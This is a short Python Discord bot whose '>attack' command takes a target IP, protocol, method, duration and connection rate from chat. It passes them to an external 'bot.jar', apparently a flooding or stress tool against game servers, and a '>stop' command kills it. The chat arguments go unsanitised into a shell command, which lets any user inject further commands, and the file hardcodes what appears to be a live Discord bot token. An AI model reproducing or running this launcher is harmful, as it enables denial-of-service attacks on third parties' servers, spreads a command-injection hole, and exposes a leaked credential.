import discord
import subprocess
from discord.ext import commands
bot = commands.Bot(command_prefix=">", intents=discord.Intents.all())
@bot.command()
async def attack(ctx, ip, protocol, method, time, cps):
    subprocess.Popen(f"java -jar bot.jar {ip} {protocol} {method} {time} {cps}", shell=True)
    await ctx.send("+conc")
@bot.command()
async def stop(ctx):
    subprocess.Popen(f"pkill java", shell=True)
    await ctx.send("-conc")
bot.run("MTI3Nzg5Njk2MTk0NDcxOTM2MA.GVWt-9.z1_fSMBuaOjpmlr9YX3xvuKN1cZ2nZh98PS8yU")